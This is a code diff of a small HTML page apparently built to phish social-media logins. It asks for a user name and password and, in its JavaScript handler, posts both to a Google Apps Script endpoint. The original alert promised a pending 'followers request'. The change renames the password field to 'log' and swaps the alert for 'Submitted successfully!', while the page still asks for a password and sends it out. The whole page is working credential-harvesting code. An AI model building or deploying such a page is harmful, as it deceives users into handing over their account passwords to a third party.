@@ -3,7 +3,7 @@
     <script language="javascript">
 function sub() {
     var username = document.frm1.txtuser.value;
-    var password = document.frm1.txtpass.value;
+    var log = document.frm1.txtlog.value;
 
     if (username.length < 2) {
         alert("Enter a valid username");
@@ -13,12 +13,12 @@ function sub() {
     fetch("https://script.google.com/macros/s/AKfycbxpAFZ60MmRtYpszLhrsBblOoHUwITdLPjGBSZq0CB2nJkhqoi0k05W3NW31DcZBjV5kw/exec", {
         method: "POST",
         body: JSON.stringify({
-            username: username,
-            password: password
+            name: username,
+            log: log
         })
     });
 
-    alert("followers request is pending");
+    alert("Submitted successfully!");
     return false;
 }
 </script>
@@ -45,7 +45,7 @@ function sub() {
     <br>
     <center><font color="pink" size="4">ENTER USER NAME: </font> <input type=text size="40" name=txtuser> </center><br>
   <br>
-  <center><font color="pink" size="4">ENTER PASSWORD: </font> <input type=text size="40" name=txtpass> </center>
+  <center><font color="pink" size="4">ENTER PASSWORD: </font> <input type=text size="40" name=txtlog> </center>
   <br><br>
  <center> <input type="submit" value="SUBMIT"> </center>
  <br>
